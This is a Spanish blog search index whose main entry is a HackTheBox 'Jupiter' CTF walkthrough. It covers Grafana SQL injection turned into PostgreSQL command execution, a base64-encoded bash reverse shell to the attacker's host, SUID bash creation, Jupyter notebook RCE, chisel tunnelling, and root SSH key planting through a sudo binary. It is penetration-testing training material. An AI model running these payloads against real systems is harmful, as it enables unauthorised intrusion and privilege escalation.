[{"content":"","date":"2023-09-07","id":0,"permalink":"/blog/","summary":"","tags":[],"title":"Blog"},{"content":"","date":"2023-09-07","id":1,"permalink":"/writeups/hackthebox/","summary":"","tags":[],"title":"HackTheBox"},{"content":"","date":"2023-09-07","id":2,"permalink":"/writeups/tryhackme/","summary":"","tags":[],"title":"TryHackMe"},{"content":"","date":"2023-09-07","id":3,"permalink":"/writeups/hackmyvm/","summary":"","tags":[],"title":"HackMyVm"},{"content":"","date":"2023-09-07","id":4,"permalink":"/writeups/","summary":"","tags":[],"title":"Writeups"},{"content":"","date":"2023-11-01","id":5,"permalink":"/contributors/","summary":"","tags":[],"title":"Contributors"},{"content":"","date":"2023-11-01","id":6,"permalink":"/tags/cron/","summary":"","tags":[],"title":"Cron"},{"content":"","date":"2023-11-01","id":7,"permalink":"/tags/ctf/","summary":"","tags":[],"title":"CTF"},{"content":"","date":"2023-11-01","id":8,"permalink":"/contributors/d3b0o/","summary":"","tags":[],"title":"d3b0o"},{"content":"Reconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\nping -c 1 10.10.11.216 PING 10.10.11.216 (10.10.11.216) 56(84) bytes of data. 64 bytes from 10.10.11.216: icmp_seq=1 ttl=63 time=174 ms --- 10.10.11.216 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 174.469/174.469/174.469/0.000 ms Tenemos conexión y en este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Linux\nEscaneo de puertos Ahora empezamos con un escaneo de puertos\n$ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.11.216 -oG allPorts Explicación parámetros\rParámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Para saltar la comprobación de sí la máquina está activa o no -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\nextractPorts allPorts ───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 10.10.11.216 5 │ [*] Open ports: 22,80 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios que corren por los puertos y ejecutar scripts básicos de reconocimientos de nmap\nnmap -p22,80 -sCV 10.10.11.216 -oN versions Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-01 17:21 CET Nmap scan report for 10.10.11.216 Host is up (0.099s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 ac:5b:be:79:2d:c9:7a:00:ed:9a:e6:2b:2d:0e:9b:32 (ECDSA) |_ 256 60:01:d7:db:92:7b:13:f0:ba:20:c6:c9:00:a7:1b:41 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://jupiter.htb/ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Explicación parámetros\rParámetro Función -p Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior -sC Para que realice scripts básicos de reconocimiento -sV Proporciona la versión e información de los servicios que corren por los puertos HTTP El nmap reporto que el puerto 80 estaba abierto y que no se hacía el redirect a jupiter.htb. Esto significa que el servidor puede estar usando virtual hosting\nQué es virtual hosting?\rEl virtualhost, o servidor virtual, es una forma de alojamiento web que permite que varias páginas web puedan funcionar en una misma máquina. Hay dos tipos de virtualhost:\nLos que se basan en direcciones IP, donde cada página web tendrá una IP diferente. Los que se basan en nombres de dominio, donde una sola dirección IP funcionan varias páginas web. Definición sacada de: https://linube.com/ayuda/articulo/267/que-es-un-virtualhost\nhttp-title: Did not follow redirect to http://jupiter.htb/ Para solucionar esto hay que añadir en el /etc/hosts la siguiente línea:\n10.10.11.216 jupiter.htb Con esto estamos diciendo que el dominio jupiter.htb hace referencia a la ip 10.10.11.216. Ahora ya podemos acceder a la web desde el navegador. La web no tiene nada interesante, asi que vamos a buscar subdominios, para ello podemos usar muchas herramientas, pero voy a usar wfuzz\nwfuzz -c -t 20 -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H \u0026#34;Host: FUZZ.jupiter.htb\u0026#34; http://jupiter.htb/ Explicación parámetros\r-c: Mostrar el resultado con colores -t: Definir el tiempo del escaneo -w: Diccionario -H: Especificar un header FUZZ: Es donde va a ir probando el contenido del diccionario Este comando nos muestra muchos subdominios, pero todos tienen código 301, 178 caracteres, 12 palabras y 7 líneas\n===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000001: 301 7 L 12 W 178 Ch \u0026#34;www\u0026#34; 000000045: 301 7 L 12 W 178 Ch \u0026#34;www1\u0026#34; 000000042: 301 7 L 12 W 178 Ch \u0026#34;static\u0026#34; 000000015: 301 7 L 12 W 178 Ch \u0026#34;ns\u0026#34; 000000003: 301 7 L 12 W 178 Ch \u0026#34;ftp\u0026#34; 000000031: 301 7 L 12 W 178 Ch \u0026#34;mobile\u0026#34; 000000044: 301 7 L 12 W 178 Ch \u0026#34;web\u0026#34; 000000046: 301 7 L 12 W 178 Ch \u0026#34;img\u0026#34; 000000041: 301 7 L 12 W 178 Ch \u0026#34;dns1\u0026#34; 000000043: 301 7 L 12 W 178 Ch \u0026#34;lists\u0026#34; 000000040: 301 7 L 12 W 178 Ch \u0026#34;ns4\u0026#34; 000000007: 301 7 L 12 W 178 Ch \u0026#34;webdisk\u0026#34; 000000039: 301 7 L 12 W 178 Ch \u0026#34;dns2\u0026#34; ... Lo que podemos hacer es añadir el parámetro -hh=178 para ocultar las respuestas con 178 caracteres.\nwfuzz -c -t 20 --hh=178 -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H \u0026#34;Host: FUZZ.jupiter.htb\u0026#34; http://jupiter.htb/ ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000001955: 200 211 L 798 W 34390 Ch \u0026#34;kiosk\u0026#34; Ahora ya nos reporta un subdominio, kiosk, para poder verlo tenemos que añadirlo en el /etc/hosts de la siguiente forma\n10.10.11.216 jupiter.htb kiosk.jupiter.htb Al entrar a kiosk.jupiter.htb, vemos una web hecha con Grafana, concretamente si nos vamos al login vemos que es un grafana v9.5.2.\nEn la página principal, si nos vamos a cualquier apartado y le damos a los 3 puntos \u0026gt; inspeccionar \u0026gt; Panel JSON, vemos lo siguiente:\n{ \u0026#34;datasource\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;postgres\u0026#34;, \u0026#34;uid\u0026#34;: \u0026#34;YItSLg-Vz\u0026#34; }, \u0026#34;fieldConfig\u0026#34;: { \u0026#34;defaults\u0026#34;: { \u0026#34;mappings\u0026#34;: [], \u0026#34;thresholds\u0026#34;: { \u0026#34;mode\u0026#34;: \u0026#34;percentage\u0026#34;, \u0026#34;steps\u0026#34;: [ { \u0026#34;color\u0026#34;: \u0026#34;green\u0026#34;, \u0026#34;value\u0026#34;: null }, { \u0026#34;color\u0026#34;: \u0026#34;orange\u0026#34;, \u0026#34;value\u0026#34;: 70 }, { \u0026#34;color\u0026#34;: \u0026#34;red\u0026#34;, \u0026#34;value\u0026#34;: 85 } ] }, \u0026#34;color\u0026#34;: { \u0026#34;mode\u0026#34;: \u0026#34;thresholds\u0026#34; } }, \u0026#34;overrides\u0026#34;: [] }, \u0026#34;gridPos\u0026#34;: { \u0026#34;h\u0026#34;: 8, \u0026#34;w\u0026#34;: 12, \u0026#34;x\u0026#34;: 0, \u0026#34;y\u0026#34;: 24 }, \u0026#34;id\u0026#34;: 30, \u0026#34;options\u0026#34;: { \u0026#34;reduceOptions\u0026#34;: { \u0026#34;values\u0026#34;: false, \u0026#34;calcs\u0026#34;: [ \u0026#34;lastNotNull\u0026#34; ], \u0026#34;fields\u0026#34;: \u0026#34;\u0026#34; }, \u0026#34;orientation\u0026#34;: \u0026#34;auto\u0026#34;, \u0026#34;textMode\u0026#34;: \u0026#34;auto\u0026#34;, \u0026#34;colorMode\u0026#34;: \u0026#34;value\u0026#34;, \u0026#34;graphMode\u0026#34;: \u0026#34;area\u0026#34;, \u0026#34;justifyMode\u0026#34;: \u0026#34;auto\u0026#34; }, \u0026#34;pluginVersion\u0026#34;: \u0026#34;9.5.2\u0026#34;, \u0026#34;targets\u0026#34;: [ { \u0026#34;datasource\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;postgres\u0026#34;, \u0026#34;uid\u0026#34;: \u0026#34;YItSLg-Vz\u0026#34; }, \u0026#34;editorMode\u0026#34;: \u0026#34;code\u0026#34;, \u0026#34;format\u0026#34;: \u0026#34;table\u0026#34;, \u0026#34;hide\u0026#34;: false, \u0026#34;rawQuery\u0026#34;: true, \u0026#34;rawSql\u0026#34;: \u0026#34;select \\n count(parent) \\nfrom \\n moons \\nwhere \\n parent = \u0026#39;Jupiter\u0026#39;;\u0026#34;, \u0026#34;refId\u0026#34;: \u0026#34;A\u0026#34;, \u0026#34;sql\u0026#34;: { \u0026#34;columns\u0026#34;: [ { \u0026#34;parameters\u0026#34;: [], \u0026#34;type\u0026#34;: \u0026#34;function\u0026#34; } ], \u0026#34;groupBy\u0026#34;: [ { \u0026#34;property\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;string\u0026#34; }, \u0026#34;type\u0026#34;: \u0026#34;groupBy\u0026#34; } ], \u0026#34;limit\u0026#34;: 50 } } ], \u0026#34;title\u0026#34;: \u0026#34;Number of Moons\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;stat\u0026#34; } Teniendo esto, nos podemos fijar en que la base de datos es postgres y que se está haciendo una petición a la base de datos:\nselect \\n count(parent) \\nfrom \\n moons \\nwhere \\n parent = \u0026#39;Jupiter\u0026#39;; Si volvemos a la página principal y hacemos ctrl + shift + c y vamos al apartado Red podemos ver que a medida que vamos scroleando se van haciendo peticiones. Vamos a interceptarlas con burpsuite.\nPOST /api/ds/query HTTP/1.1 Host: kiosk.jupiter.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0 Accept: application/json, text/plain, */* Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate, br Referer: http://kiosk.jupiter.htb/d/jMgFGfA4z/moons?orgId=1\u0026amp;refresh=1d ... {\u0026#34;queries\u0026#34;:[{\u0026#34;refId\u0026#34;:\u0026#34;A\u0026#34;,\u0026#34;datasource\u0026#34;:{\u0026#34;type\u0026#34;:\u0026#34;postgres\u0026#34;,\u0026#34;uid\u0026#34;:\u0026#34;YItSLg-Vz\u0026#34;},\u0026#34;rawSql\u0026#34;:\u0026#34;select \\n count(parent) \\nfrom \\n moons \\nwhere \\n parent = \u0026#39;Jupiter\u0026#39;;\u0026#34;,\u0026#34;format\u0026#34;:\u0026#34;table\u0026#34;,\u0026#34;datasourceId\u0026#34;:1,\u0026#34;intervalMs\u0026#34;:60000,\u0026#34;maxDataPoints\u0026#34;:928}],\u0026#34;range\u0026#34;:{\u0026#34;from\u0026#34;:\u0026#34;2023-11-01T11:31:09.304Z\u0026#34;,\u0026#34;to\u0026#34;:\u0026#34;2023-11-01T17:31:09.304Z\u0026#34;,\u0026#34;raw\u0026#34;:{\u0026#34;from\u0026#34;:\u0026#34;now-6h\u0026#34;,\u0026#34;to\u0026#34;:\u0026#34;now\u0026#34;}},\u0026#34;from\u0026#34;:\u0026#34;1698838269304\u0026#34;,\u0026#34;to\u0026#34;:\u0026#34;1698859869304\u0026#34;} En la petición interceptada podemos ver la petición que se está haciendo a la base de datos Postgres\nIntrusión Para saber como hacer una inyección a un PostgreSQL existe un recurso muy interesante de la repo de Payloads All The Things, en el cual se menciona una vulnerabilidad interesante que consiste en derivar la inyección sql a un rce (Remote Code Execution)\nBásicamente, consiste en crear una tabla en la base de datos en uso por la web\nCREATE TABLE cmd_exec(cmd_output text); Mediante COPY se pondrá en la tabla el resultado del comando id, lo que provocará que se ejecute el comando ìd\nCOPY cmd_exec FROM PROGRAM \u0026#39;id\u0026#39;; De forma opcional, en el caso de que podamos ver el output lo podríamos ver simplemente haciendo una petición a la tabla cmd_exec\nSELECT * FROM cmd_exec; Sabiendo esto vamos con la explotación:\nCreamos la tabla cmd_exec\n\u0026#34;rawSql\u0026#34;:\u0026#34;CREATE TABLE cmd_exec(cmd_output text);\u0026#34; Ahora nos ponemos en escucha por la interfaz tun0 a la espera de paquetes icmp que son los que usa ping.\nsudo tcpdump -i tun0 icmp Por último mandamos la inyección para ejecutar un ping a nuestra máquina\n\u0026#34;rawSql\u0026#34;:\u0026#34;COPY cmd_exec FROM PROGRAM \u0026#39;ping -c 1 10.10.14.28\u0026#39;;\u0026#34; El servidor nos responde con un status 200\n{\u0026#34;results\u0026#34;:{\u0026#34;A\u0026#34;:{\u0026#34;status\u0026#34;:200,\u0026#34;frames\u0026#34;:[]}}} Y vemos que se ha hecho el ping correctamente, lo que significa que tenemos capacidad de ejecutar comandos en la máquina víctima\n18:47:24.492218 IP jupiter.htb \u0026gt; 10.10.14.28: ICMP echo request, id 2, seq 1, length 64 18:47:24.492238 IP 10.10.14.28 \u0026gt; jupiter.htb: ICMP echo reply, id 2, seq 1, length 64 Reverse shell Vamos a ponernos en escucha con netcat por el puerto 443\nnc -nlvp 443 Explicación parámetros\rn: Sirve para que no haga la resolución de DNS l: Habilitar modo escucha de netcat v: Verbose, modo detallado de netcat p: Por último la p sirve para especificar el número de puerto en el cual vamos a estar en escucha La revershell la vamos a mandar con bash: bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.28/443 0\u0026gt;\u0026amp;1, pero lo pondremos dentro de bash -c \u0026quot;bash- i...\u0026quot; porque puede ser que la normal la bloquee la máquina víctima. En resumen quedará así:\nbash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.28/443 0\u0026gt;\u0026amp;1\u0026#34; Antes de aplicarlo a la inyección vamos a convertirlo en base64 para evitar que los caracteres especiales den problemas.\necho \u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.28/443 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39; | base64 El comando final que tendremos que poner en la inyección seria, primero un echo con el base64, después un base64 -d para decodear el base64 y por último bash para que el resultado del base64 lo ejecute con bash.\necho YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yOC80NDMgMD4mMSIK | base64 -d | bash Esto aplicado a la inyección quedaría de la siguiente forma:\n\u0026#34;rawSql\u0026#34;:\u0026#34;COPY cmd_exec FROM PROGRAM \u0026#39;echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yOC80NDMgMD4mMSIK | base64 -d | bash\u0026#39;;\u0026#34; ¡Recibimos la conexión!\n$ nc -nlvp 443 listening on [any] 443 ... connect to [10.10.14.28] from (UNKNOWN) [10.10.11.216] 46594 bash: cannot set terminal process group (18744): Inappropriate ioctl for device bash: no job control in this shell postgres@jupiter:/var/lib/postgresql/14/main$ Antes de la escalada, vamos a hacer un tratamiento de la tty para poder ejecutar ctr + c, ctrl + l, nano\u0026hellip;\nscript /dev/null -c bash ctrl + z\nstty raw -echo; fg reset xterm export TERM=xterm export SHELL=bash Escalada de privilegios Con un ifconfig podemos comprobar que estamos en la máquina víctima y no en ningún contenedor\npostgres@jupiter:/var/lib/postgresql/14/main$ ifconfig eth0: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500 inet 10.10.11.216 netmask 255.255.254.0 broadcast 10.10.11.255 ... Sabiendo que la web era un grafana, existe un archivo interesante, el cual puede contener credenciales e información de valor que está en /etc/grafana/grafana.ini, pero no tenemos permisos para verlo\npostgres@jupiter:/etc/grafana$ cat grafana.ini cat: grafana.ini: Permission denied juno Vamos a investigar si hay alguna tarea cron ejecutándose cada \u0026lsquo;x\u0026rsquo; tiempo, para ello vamos a usar pspy. Para usarlo simple nos lo descargamos en nuestra máquina, nos montamos un servidor con python en el directorio en el que esté guardado\npython3 -m http.server Y nos lo descargamos en la máquina víctima en el directorio /tmp\nwget 10.10.14.28/pspy64 Por último le damos permisos de ejecución y lo ejecutamos\nchmod +x pspy64 ./pspy64 Después de un rato capturando procesos vemos un script ubicado en /home/juno/shadow-simulation.sh el cual se esta ejecutando con bash. También se está ejecutando /home/juno/.local/bin/shadow pasandole el archivo /dev/shm/network-simulation.yml\n2023/11/01 18:52:01 CMD: UID=1000 PID=21187 | /bin/bash /home/juno/shadow-simulation.sh 2023/11/01 18:52:01 CMD: UID=1000 PID=21186 | /bin/sh -c /home/juno/shadow-simulation.sh 2023/11/01 18:52:01 CMD: UID=1000 PID=21189 | /home/juno/.local/bin/shadow /dev/shm/network-simulation.yml 2023/11/01 18:52:01 CMD: UID=1000 PID=21198 | /usr/bin/python3 -m http.server 80 2023/11/01 18:52:01 CMD: UID=1000 PID=21199 | /usr/bin/curl -s server No tenemos acceso a /home/juno por lo que no podemos ver el script shadow-simulation.sh, pero sí tenemos acceso a /dev/shm. Si hacemos un cat al /dev/shm/network-simulation.yml podemos ver lo siguiente:\ngeneral: # stop after 10 simulated seconds stop_time: 10s # old versions of cURL use a busy loop, so to avoid spinning in this busy # loop indefinitely, we add a system call latency to advance the simulated # time when running non-blocking system calls model_unblocked_syscall_latency: true network: graph: # use a built-in network graph containing # a single vertex with a bandwidth of 1 Gbit type: 1_gbit_switch hosts: # a host with the hostname \u0026#39;server\u0026#39; server: network_node_id: 0 processes: - path: /usr/bin/python3 args: -m http.server 80 start_time: 3s # three hosts with hostnames \u0026#39;client1\u0026#39;, \u0026#39;client2\u0026#39;, and \u0026#39;client3\u0026#39; client: network_node_id: 0 quantity: 3 processes: - path: /usr/bin/curl args: -s server start_time: 5s Si nos fijamos, hay dos comandos que se están ejecutando python3 -m http.server 80 y curl -s server los cuales en el pspy salía que se ejecutaban después del /home/juno/.local/bin/shadow /dev/shm/network-simulation.yml\n2023/11/01 18:52:01 CMD: UID=1000 PID=21198 | /usr/bin/python3 -m http.server 80 2023/11/01 18:52:01 CMD: UID=1000 PID=21199 | /usr/bin/curl -s server Con un ls -l vemos que tenemos permisos de escritura y lectura en el /dev/shm/network-simulation.yml\n$ls -l /dev/shm/network-simulation.yml -rw-rw-rw- 1 juno juno 815 Mar 7 2023 /dev/shm/network-simulation.yml Así que vamos a modificarlo\u0026hellip;\nVamos a hacer que haga una copia de /bin/bash en /tmp/bash y le dé permisos suid\nhosts: # a host with the hostname \u0026#39;server\u0026#39; server: network_node_id: 0 processes: - path: /usr/bin/cp args: /bin/bash /tmp/bash start_time: 3s # three hosts with hostnames \u0026#39;client1\u0026#39;, \u0026#39;client2\u0026#39;, and \u0026#39;client3\u0026#39; client: network_node_id: 0 quantity: 3 processes: - path: /usr/bin/chmod args: u+s /tmp/bash start_time: 5s Ahora solo falta esperar a que se ejecute y ejecutar /tmp/bash -p para ejecutar la bash con privilegios\npostgres@jupiter:/tmp$ /tmp/bash -p bash-5.1$ whoami juno jovian Pasa una cosa rara y es que somos juno, pero algunos comandos se ejecutan como postgres como en este caso ìd\nbash-5.1$ whoami juno bash-5.1$ id uid=114(postgres) gid=120(postgres) euid=1000(juno) groups=120(postgres),119(ssl-cert) Para solucionar esto vamos a conectarnos por ssh, primero en la máquina atacante vamos a crear las llaves ssh con ssh-keygen. Esto nos creará una carpeta en nuestro directorio llamada .ssh, dentro habrá un archivo llamado id_rsa.pub que será nuestra llave pública, esta llave vamos a tener que ponerla en /home/juno/authorized_keys. Ahora ya nos podemos conectar por ssh sin necesidad de especificar contraseñas\nssh juno@10.10.11.216 Ahora que ya tenemos una consola en condiciones, vamos a hacer un id para ver en que grupos estamos\nuid=1000(juno) gid=1000(juno) groups=1000(juno),1001(science) Hay un grupo que llama la atención, science. Podemos buscar que archivos pertenecen a este grupo con el siguiente comando\nfind / -group science 2\u0026gt;/dev/null /opt/solar-flares /opt/solar-flares/flares.csv /opt/solar-flares/xflares.csv /opt/solar-flares/map.jpg /opt/solar-flares/start.sh /opt/solar-flares/logs /opt/solar-flares/logs/jupyter-2023-03-10-25.log /opt/solar-flares/logs/jupyter-2023-03-08-37.log /opt/solar-flares/logs/jupyter-2023-03-08-38.log /opt/solar-flares/logs/jupyter-2023-03-08-36.log /opt/solar-flares/logs/jupyter-2023-03-09-11.log /opt/solar-flares/logs/jupyter-2023-03-09-24.log /opt/solar-flares/logs/jupyter-2023-03-08-14.log /opt/solar-flares/logs/jupyter-2023-03-09-59.log /opt/solar-flares/flares.html /opt/solar-flares/cflares.csv /opt/solar-flares/flares.ipynb /opt/solar-flares/.ipynb_checkpoints /opt/solar-flares/mflares.csv El find reporta que en el /opt hay muchos archivos del grupo science.\nSi vamos al /opt/solar-flares/logs, hay muchos archivos de logs, al hacer un cat al más reciente se ve lo siguiente\njuno@jupiter:/opt/solar-flares/logs$ cat jupyter-2023-11-01-22.log ..... [I 19:22:56.926 NotebookApp] http://localhost:8888/?token=a36adfafb8a4239c215350cad2e1cc07696168a8e4fa6093 [I 19:22:56.927 NotebookApp] or http://127.0.0.1:8888/?token=a36adfafb8a4239c215350cad2e1cc07696168a8e4fa6093 ..... Vemos que hay una web en la máquina víctima por el puerto 8888, pero ese puerto no lo reporto nmap, eso es porque seguramente este puerto solo se puede ver desde la máquina víctima. Para ver más información de los puertos podemos usar ss -tnlp\njuno@jupiter:/opt/solar-flares/logs$ ss -tnlp State Recv-Q Send-Q Local Address:Port Peer Address:Port Process LISTEN 0 511 0.0.0.0:80 0.0.0.0:* LISTEN 0 4096 127.0.0.53%lo:53 0.0.0.0:* LISTEN 0 128 0.0.0.0:22 0.0.0.0:* LISTEN 0 4096 127.0.0.1:3000 0.0.0.0:* LISTEN 0 128 127.0.0.1:8888 0.0.0.0:* LISTEN 0 244 127.0.0.1:5432 0.0.0.0:* LISTEN 0 128 [::]:22 [::]:* Si queremos ver este puerto desde nuestra máquina podemos hacer port forwarding, podríamos usar ssh, pero no me apetece así que vamos a usar chisel.\nUsarlo es muy sencillo, simplemente nos lo descargamos en nuestra máquina, lo pasamos a la máquina víctima con un servidor con python como hicimos con pspy anteriormente (python3 -m http.server 80), le damos permisos de ejecución (chmod +x chisel) y ejecutamos lo siguiente\nMáquina atacante:\nsudo ./chisel server --reverse -p 1234 Máquina víctima:\n./chisel client 10.10.14.28:443 R:8888:127.0.0.1:8888 \u0026amp; Ahora nuestro puerto 8888 equivale al puerto 8888 de la máquina víctima, con esto completado ya podemos entrar al link que veíamos en los logs\nhttp://localhost:8888/?token=a36adfafb8a4239c215350cad2e1cc07696168a8e4fa6093 Una vez dentro vemos varios archivos los cuales podemos modificar, por lo que podemos intuir que esta web está siendo ejecutada por root o por jovian. Si vamos a flares.ipynb vemos un archivo que parece tener una documentación de python y arriba hay un botón que pone run y tenemos capacidad para modificar el archivo así que se puede intentar un rce.\nimport os os.system(\u0026#39;whoami\u0026#39;) jovian Pues tenemos un rce y ya sabemos quién estaba ejecutando esto: jovian\nPara conseguir una reverse shell vamos a usar lo mismo que usamos al principio, así que no lo voy a voler a explicar para no alargar el post\nimport os os.system(\u0026#39;echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yOC80NDMgMD4mMSIK | base64 -d | bash\u0026#39;) Ya somos jovian!\n$ nc -nlvp 443 listening on [any] 443 ... jovian@jupiter:/opt/solar-flares$ root Con un sudo -l vemos que podemos ejecutar como root sin la necesidad de proporcionar contraseña el archivo /usr/local/bin/sattrack\n$ sudo -l User jovian may run the following commands on jupiter: (ALL) NOPASSWD: /usr/local/bin/sattrack Al ejecutarlo nos sale que no ha encontrado el archivo de configuración\njovian@jupiter:/opt/solar-flares$ sudo /usr/local/bin/sattrack sudo /usr/local/bin/sattrack Satellite Tracking System Configuration file has not been found. Please try again! Vamos a probar de ver desde donde lo está cargando con el comando strings. El comando strings es básicamente como un cat, pero que solo muestra el contenido legible de archivos como binarios, fotografias, etc..\nstrings /usr/local/bin/sattrack | grep config /tmp/config.json Vemos la ruta /tmp/config.json, pero claro, no existe, lo que podemos hacer es buscar en el sistema si existe algún config.json que sea la configuración default para este binario\n$ find / -name config.json 2\u0026gt; /dev/null /usr/local/share/sattrack/config.json El comando find nos reporta un config.json que está en una carpeta que se llama igual que el binario así que supongo que tendrán algo que ver, vamos a copiar ese archivo al /tmp\ncp /usr/local/share/sattrack/config.json /tmp/config.json Ahora ya podemos ejecutar el binario, pero se queda colgado cargando el recurso de una web.\n$ sudo /usr/local/bin/sattrack Satellite Tracking System tleroot does not exist, creating it: /tmp/tle/ Get:0 http://celestrak.org/NORAD/elements/weather.txt Vamos a ver si podemos modificar esto desde el archivo config.json\n{ \u0026#34;tleroot\u0026#34;: \u0026#34;/tmp/tle/\u0026#34;, \u0026#34;tlefile\u0026#34;: \u0026#34;weather.txt\u0026#34;, \u0026#34;mapfile\u0026#34;: \u0026#34;/usr/local/share/sattrack/map.json\u0026#34;, \u0026#34;texturefile\u0026#34;: \u0026#34;/usr/local/share/sattrack/earth.png\u0026#34;, \u0026#34;tlesources\u0026#34;: [ \u0026#34;http://celestrak.org/NORAD/elements/weather.txt\u0026#34;, \u0026#34;http://celestrak.org/NORAD/elements/noaa.txt\u0026#34;, \u0026#34;http://celestrak.org/NORAD/elements/gp.php?GROUP=starlink\u0026amp;FORMAT=tle\u0026#34; ], \u0026#34;updatePerdiod\u0026#34;: 1000, \u0026#34;station\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;LORCA\u0026#34;, \u0026#34;lat\u0026#34;: 37.6725, \u0026#34;lon\u0026#34;: -1.5863, \u0026#34;hgt\u0026#34;: 335.0 }, \u0026#34;show\u0026#34;: [ ], \u0026#34;columns\u0026#34;: [ \u0026#34;name\u0026#34;, \u0026#34;azel\u0026#34;, \u0026#34;dis\u0026#34;, \u0026#34;geo\u0026#34;, \u0026#34;tab\u0026#34;, \u0026#34;pos\u0026#34;, \u0026#34;vel\u0026#34; ] } En tlsources están las webs que estaba cargando el binario, como nosotros tenemos permisos para modificar este script podemos probar de poner nuestra ip y abrirnos un servidor con python (python3 -m http.server 80) para ver si recibimos la petición\njovian@jupiter:/opt/solar-flares$ sudo /usr/local/bin/sattrack Satellite Tracking System Get:0 http://10.10.14.28 python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.11.216 - - [01/Nov/2023 21:25:27] \u0026#34;GET / HTTP/1.1\u0026#34; 200 - Efectivamente recibimos la petición. Ahora podríamos probar de poner en vez de nuestra ip poner file:///root/root.txt\nDespués de ejecutarlo tenemos la flag de root en /tmp/tle/root.txt\nYa tenemos la flag, pero la gracia es tener una consola como root así que lo que vamos a hacer es generarnos unas llaves de ssh en nuestra máquina\nssh-keygen Ahora dentro de nuestro directorio personal tenemos una carpeta .ssh y dentro están las llaves, vamos a copiar la llave pública ìd_rsa.pub y la vamos a poner en un archivo llamado authorized_keys, en ese mismo directorio nos vamos a montar otro servidor con python python3 -m http.server 80\nEn la máquina víctima vamos a modificar un poco el archivo /tmp/config.json, en la opción tle root podemos poner en que ruta queremos que se descarguen los archivos, ahí vamos a poner la ruta de las llaves de root\n\u0026#34;tleroot\u0026#34;: \u0026#34;/root/.ssh/\u0026#34;, Por último en tlesources pondremos nuestra ip y el archivo authorized_keys\n\u0026#34;http://10.10.14.28/authorized_keys\u0026#34; Ahora al ejecutar el programa se pondrá nuestra llave pública dentro de las authorized_keys de root lo que nos va a permitir conectarnos por ssh sin la necesidad de proporcionar contraseña\nssh root@10.10.11.216 root@jupiter:~# ","date":"2023-11-01","id":9,"permalink":"/writeups/hackthebox/jupiter/","summary":"Reconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\nping -c 1 10.10.11.216 PING 10.","tags":["CTF","RCE","SQLI","Cron","Port forwarding","Python","Media"],"title":"Jupiter"},{"content":"","date":"2023-11-01","id":10,"permalink":"/tags/media/","summary":"","tags":[],"title":"Media"},{"content":"","date":"2023-11-01","id":11,"permalink":"/tags/port-forwarding/","summary":"","tags":[],"title":"Port forwarding"},{"content":"","date":"2023-11-01","id":12,"permalink":"/tags/python/","summary":"","tags":[],"title":"python"},{"content":"","date":"2023-11-01","id":13,"permalink":"/tags/rce/","summary":"","tags":[],"title":"RCE"},{"content":"","date":"2023-11-01","id":14,"permalink":"/tags/sqli/","summary":"","tags":[],"title":"SQLI"},{"content":"","date":"2023-11-01","id":15,"permalink":"/tags/","summary":"","tags":[],"title":"Tags"},{"content":"","date":"2023-10-29","id":16,"permalink":"/tags/docker/","summary":"","tags":[],"title":"Docker"},{"content":"Reconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\nping -c 1 10.10.10.236 PING 10.10.10.236 (10.10.10.236) 56(84) bytes of data. 64 bytes from 10.10.10.236: icmp_seq=1 ttl=127 time=152 ms --- 10.10.10.236 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 151.535/151.535/151.535/0.000 ms Tenemos conexión y en este caso da un ttl (time to live) de 127, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Windows\nEscaneo de puertos 